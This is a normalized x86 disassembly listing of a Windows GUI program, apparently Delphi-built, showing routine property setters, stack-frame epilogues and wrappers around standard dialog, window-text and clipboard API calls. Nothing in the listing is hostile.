cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_42dbd8
sub_42db73
jmp sub_4039a8
sub_42db84
jmp sub_4036f4
sub_42dbc7
jmp sub_4039a8
sub_42dbce
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dd75
jmp sub_4039a8
sub_42ddb5
jmp sub_4039a8
sub_42ddbc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42de14
add eax 0x8
call sub_40d788
retn
sub_42de20
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d32c
mov [ rw-data ] eax
sub_42de71
jmp sub_4039a8
sub_42de78
pop ebp
retn
sub_42de7c
sub [ rw-data ] 0x1
retn
sub_42e189
jmp sub_4039a8
sub_42e190
pop ebp
retn
sub_42e194
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42dee0
sub_42e274
retn
sub_42e300
mov edx [ eax ]
call [ edx ]
retn
sub_42e308
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42e335
jmp sub_4039a8
sub_42e33c
pop ebp
retn
sub_42e340
sub [ rw-data ] 0x1
retn
sub_42e4ff
jmp sub_4039a8
sub_42e506
pop ebp
retn
sub_42e8bb
jmp sub_4039a8
sub_42e8c2
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42ecdc
jmp sub_4039a8
sub_42ece3
pop ebp
retn
sub_42ece8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e278
mov [ rw-data ] eax
sub_42ed29
jmp sub_4039a8
sub_42ed30
pop ebp
retn
sub_42ed34
sub [ rw-data ] 0x1
retn
sub_42ed61
jmp sub_4039a8
sub_42ed68
pop ebp
retn
sub_42ed6c
sub [ rw-data ] 0x1
retn
sub_42ed99
jmp sub_4039a8
sub_42eda0
pop ebp
retn
sub_42eda4
sub [ rw-data ] 0x1
retn
sub_42edd1
jmp sub_4039a8
sub_42edd8
pop ebp
retn
sub_42eddc
sub [ rw-data ] 0x1
retn
sub_42ee09
jmp sub_4039a8
sub_42ee10
pop ebp
retn
sub_42ee14
sub [ rw-data ] 0x1
retn
sub_42ee41
jmp sub_4039a8
sub_42ee48
pop ebp
retn
sub_42ee4c
sub [ rw-data ] 0x1
retn
sub_42eead
jmp sub_4039a8
sub_42eeb4
pop ebp
retn
sub_42eeb8
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ GetOpenFileNameA@IAT ]
GetSaveFileNameA
jmp [ GetSaveFileNameA@IAT ]
FindTextA
jmp [ FindTextA@IAT ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
PrintDlgA
jmp [ PrintDlgA@IAT ]
sub_42ef0d
jmp sub_4039a8
sub_42ef14
pop ebp
retn
sub_42ef18
sub [ rw-data ] 0x1
retn
sub_42ef45
jmp sub_4039a8
sub_42ef4c
pop ebp
retn
sub_42ef50
sub [ rw-data ] 0x1
retn
sub_42ff2a
jmp sub_4036f4
sub_42ff2f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ff4c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42ff54
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403450
pop esi
retn
sub_42ff6c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403450
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42ff84
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_43002d
jmp sub_4039a8
sub_43005b
jmp sub_4039a8
sub_430062
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43006c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_430080
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_430318
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_430338
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_430358
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_4303aa
jmp sub_4039a8
sub_4303b1
pop ecx
pop ebp
retn
sub_4306f9
jmp sub_4039a8
sub_430700
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_430839
jmp sub_4039a8
sub_430840
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4308ff
jmp sub_4039a8
sub_430906
pop ebx
mov esp ebp
pop ebp
retn
sub_4309b8
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ eax + 0x64 ]
retn
mov eax [ eax + 0x68 ]
retn
sub_430a20
push ebx
mov ebx eax
mov edx GetOpenFileNameA
mov eax ebx
call sub_430448
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_430a38
push ebx
cmp [ eax + 0xaa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
sub_430a54
push ebx
mov ebx eax
mov edx GetSaveFileNameA
mov eax ebx
call sub_430448
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_430b60
jmp sub_4039a8
sub_430bdc
jmp sub_4039a8
sub_430be3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430c6e
jmp sub_4039a8
sub_430f05
retn 0x44
sub_430ffc
call sub_403254
retn
sub_431384
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_431398
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_404214
pop esi
pop ebx
retn
sub_4313b4
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_4313cc
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_431400
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_404214
pop esi
pop ebx
retn
sub_43141c
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_4313cc
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_431516
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_4317fd
retn
sub_4317fe
jmp sub_4039a8
j_sub_4317fd
jmp sub_4317fd
sub_431805
pop ebp
retn
sub_433fc8
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_433fd0
mov eax [ eax + 0x16c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_433fdc
mov eax [ eax + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_433fe8
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4340cc
xor edx edx
mov ecx [ eax + 0x168 ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_4342c5
jmp sub_4039a8
sub_4342cc
pop ebx
mov esp ebp
pop ebp
retn
sub_4343d8
cmp dl [ eax + 0x179 ]
je r-xdata
retn
mov [ eax + 0x179 ] dl
mov edx eax
call sub_434448
sub_4343f0
push esi
mov esi eax
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_434400
cmp dl [ eax + 0x178 ]
je r-xdata
retn
mov [ eax + 0x178 ] dl
mov edx eax
call sub_434448
sub_434418
cmp dl [ eax + 0x17b ]
je r-xdata
retn
mov [ eax + 0x17b ] dl
mov edx eax
call sub_434448
sub_434430
cmp dl [ eax + 0x17d ]
je r-xdata
retn
mov [ eax + 0x17d ] dl
mov edx eax
call sub_434448
sub_434644
push esi
mov esi eax
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434660
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_434af6
jmp sub_4036f4
sub_434baf
jmp sub_4039a8
sub_434bb6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434bbc
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_434b30
sub_434bcc
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_434b30
sub_434bdc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_434b30
pop ebp
retn 0x8
sub_434bf4
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_434d20
push ebx
mov ebx eax
mov eax ebx
call sub_44fd78
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_434d34
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_434d68
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_434e6c
jmp sub_4039a8
sub_434e73
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435016
jmp sub_4039a8
sub_43501d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435027
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43503c
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_44d060
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_435074
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_44d060
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_435090
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_44d060
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4350ac
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_44dd40
sub_4350c0
mov al [ eax + 0x220 ]
retn
sub_435229
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_435241
jmp sub_4039a8
sub_435389
retn 0x44
sub_43554d
jmp sub_4036f4
sub_4356c0
retn
sub_43584d
jmp sub_4039a8
sub_4358d0
push ebx
mov ebx eax
mov eax ebx
call sub_44c074
mov eax ebx
call sub_4356c4
pop ebx
retn
sub_4358e4
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44c794
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_435a0c
pop ebx
retn
sub_4359fc
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_435ad5
jmp sub_4039a8
sub_435adc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435b24
push ebx
mov ebx eax
mov eax ebx
call sub_44fcfc
mov eax ebx
call sub_4356c4
pop ebx
retn
sub_435b38
push ebx
mov ebx eax
mov eax ebx
call sub_43fe6c
mov eax ebx
call sub_4356c4
pop ebx
retn
sub_435b4c
mov al 0x1
retn
sub_435b50
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_436283
jmp sub_4039a8
sub_4362f0
jmp sub_4039a8
sub_43640c
push ebx
lea ebx [ eax + 0x190 ]
push ebx
lea ebx [ eax + 0x1ac ]
push ebx
call sub_436338
pop ebx
retn
sub_436558
mov [ eax + 0x16d ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_436908
jmp sub_4039a8
sub_43690f
pop ebp
retn
sub_436914
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d2c
mov eax [ r-xdata ]
call sub_419e0c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
sub_436969
jmp sub_4039a8
sub_436970
pop ebp
retn
sub_436974
sub [ rw-data ] 0x1
retn
sub_436980
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_436a58
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_436b8e
jmp sub_4039a8
sub_436b95
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436c3e
jmp sub_4039a8
sub_436ca4
jmp sub_4039a8
sub_436cab
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436d09
jmp sub_4039a8
sub_436d10
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436df5
jmp sub_4039a8
sub_436dfc
pop ebx
mov esp ebp
pop ebp
retn
sub_436e79
jmp sub_4039a8
sub_436e80
pop ebx
mov esp ebp
pop ebp
retn
sub_436f1e
jmp sub_4036f4
sub_436fb5
jmp sub_4039a8
sub_436fbc
pop ebp
retn
sub_436fc0
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_43703c
retn
sub_43703d
jmp sub_4039a8
j_sub_43703c
jmp sub_43703c
sub_437044
pop ebp
retn
sub_437048
sub [ rw-data ] 0x1
retn
sub_437a90
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_438213
jmp sub_4039a8
sub_43824f
jmp sub_4039a8
sub_438e5a
jmp sub_4039a8
sub_438e61
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4390e8
call sub_44b4f4
retn
sub_4390f0
push ebx
mov ebx eax
mov eax ebx
call sub_43910c
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_439104
mov eax [ r-xdata ]
retn
sub_43910c
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_439118
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_437c00
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_439130
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_439168
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_439218
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439234
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_439170
sub_439248
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439264
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_439284
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4392dc
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_439170
sub_4392f0
push esi
mov esi eax
mov eax esi
call sub_44b6a4
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_403450
sub_43943d
jmp sub_4039a8
sub_439444
pop edi
pop esi
pop ecx
pop ebp
retn
sub_43944c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_439454
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43945c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_437b8c
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_437ca0
pop esi
pop ebx
retn
sub_43968c
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403254
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_439a43
jmp sub_4036f4
sub_439a7b
jmp sub_4039a8
sub_439a82
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_439d41
jmp sub_4039a8
sub_439df0
push ebx
mov ebx eax
mov eax ebx
call sub_404464
push eax
call GetFileAttributesA
cmp eax 0xffffffff
setne al
pop ebx
retn
sub_439f44
jmp sub_4036f4
sub_439fe0
jmp sub_4039a8
sub_439fe7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439ff0
call sub_43006c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46b85c
retn
sub_43a0dc
jmp sub_4039a8
sub_43a0e3
pop ebx
mov esp ebp
pop ebp
retn
sub_43a0e8
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
xor edx edx
mov [ eax + 0x44 ] edx
test [ eax + 0x5e ] 0x1
jne r-xdata
mov edx r-xdata
mov [ eax + 0x44 ] edx
jmp r-xdata
call sub_430a20
retn
sub_43a366
jmp sub_4039a8
sub_43a36d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a38a
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_43a383
jmp sub_4039a8
sub_43a38a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a3c6
add [ eax ] al
cmp [ ecx ] 0x1b
jne r-xdata
retn
mov eax edx
call sub_4674cc
sub_43a423
jmp sub_4039a8
sub_43a42a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43a455
jmp sub_4039a8
sub_43a45c
pop ebp
retn
sub_43a460
sub [ rw-data ] 0x1
retn
sub_43a4bc
jmp sub_4039a8
sub_43a4c3
pop ebp
retn
sub_43a4c8
sub [ rw-data ] 0x1
retn
sub_43a524
jmp sub_4039a8
sub_43a52b
pop ebp
retn
sub_43a530
sub [ rw-data ] 0x1
retn
sub_43a591
jmp sub_4039a8
sub_43a598
pop ebp
retn
sub_43a59c
sub [ rw-data ] 0x1
retn
sub_43a5e8
jmp sub_4039a8
sub_43a5ef
pop ebp
retn
sub_43a5f4
sub [ rw-data ] 0x1
retn
sub_43a621
jmp sub_4039a8
sub_43a628
pop ebp
retn
sub_43a62c
sub [ rw-data ] 0x1
retn
sub_43a6d4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40c4c0
mov [ rw-data ] eax
sub_43a709
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_43a720
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_43a7a3
jmp sub_4039a8
sub_43a7aa
pop ebp
retn
sub_43a7ac
sub [ rw-data ] 0x1
retn
sub_43a81b
jmp [ edi ]
sub_43aabc
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43aad4
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43ab18
push ebx
mov ebx eax
mov eax ebx
call sub_43b374
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43b363
jmp sub_4039a8
sub_43b374
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42ec6c
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43aae8
sub_43b3cb
jmp sub_4039a8
sub_43b3d2
pop ebp
retn
sub_43b3d4
sub [ rw-data ] 0x1
retn
sub_43b3dc
sub [ ebx + eax * 2 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi * 4 + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_43be0c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_43d259
retn 0x44
sub_43d3cd
retn 0x44
sub_43dae9
retn 0x44
sub_43dc8d
retn 0x44
sub_43e3e1
retn 0x44
sub_43f9e7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x23cd172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43fda2
jmp sub_4039a8
sub_43fda9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fe2e
jmp sub_4039a8
sub_43fe35
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43fe3c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44d060
pop ebx
retn
sub_43fe50
push ebx
mov ebx eax
mov eax ebx
call sub_44fdb8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44d060
pop ebx
retn
sub_43fe6c
push ebx
mov ebx eax
mov eax ebx
call sub_44ed8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43ff18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449fb8
pop esi
pop ebx
retn
sub_440082
jmp sub_4039a8
sub_440089
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440198
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44c074
mov eax ebx
mov si 0xffc7
call sub_403450
pop esi
pop ebx
retn
sub_440284
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4402a0
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403450
sub_4402bc
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4402c8
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_420094
sub_4402dc
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44033c
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4403b0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403450
pop esi
pop ebx
retn
sub_4403cc
push esi
mov esi eax
mov eax esi
call sub_44bb80
mov eax esi
mov si 0xffc7
call sub_403450
pop esi
retn
sub_440471
jmp sub_4039a8
sub_440478
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440480
push ebx
mov ebx eax
mov eax ebx
call sub_44bce4
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_4404a4
push ebx
mov ebx eax
mov eax ebx
call sub_44bcfc
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_440590
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_440bb8
sub_4405a4
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_440bb8
mov eax ebx
call sub_44dd40
sub_4405c8
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_44dd40
sub_4405dc
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_44dd40
sub_440620
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_44dd40
sub_440721
jmp sub_4039a8
sub_440728
pop ebx
pop ecx
pop ebp
retn
sub_440840
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_4507d8
push eax
call SetWindowTextA
pop ebx
retn
sub_44085c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x301
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_440878
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_44091e
jmp sub_4039a8
sub_440925
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4409be
jmp sub_4039a8
sub_440b37
jmp sub_4039a8
sub_440b9c
push ebx
mov ebx eax
mov eax ebx
call sub_440634
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_44db3c
pop ebx
retn
sub_440c9c
push ebx
mov ebx eax
mov eax ebx
call sub_449bc4
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_440d94
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403450
sub_440ef6
jmp sub_4039a8
sub_440fa0
mov eax [ r-xdata ]
retn
sub_440fa8
xor eax eax
retn
sub_440fcc
retn
sub_4410e4
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44dd40
sub_44115c
push ebx
mov ebx eax
mov eax ebx
call sub_461dc8
test eax eax
je r-xdata
mov eax ebx
call sub_44b4f4
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_441180
xor eax eax
retn
sub_441247
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3af9173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_441260
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403450
sub_441351
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_44135a
jmp sub_4039a8
j_sub_441351
jmp sub_441351
sub_441361
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44150c
push ebx
mov ebx eax
mov eax ebx
call sub_449bc4
mov eax ebx
call sub_44b4f4
pop ebx
retn
sub_441520
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_44152c
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44dd40
sub_441540
test dl dl
je r-xdata
xor edx edx
call sub_441554
retn
mov dl 0x1
call sub_441554
retn
sub_441630
push ebx
mov ebx eax
mov eax ebx
call sub_44ed8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_441644
call sub_44dd40
retn
sub_4416da
jmp sub_4039a8
sub_4416e1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4416e8
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_441758
mov al [ eax + 0x211 ]
retn
sub_44178c
cmp dl [ eax + 0x210 ]
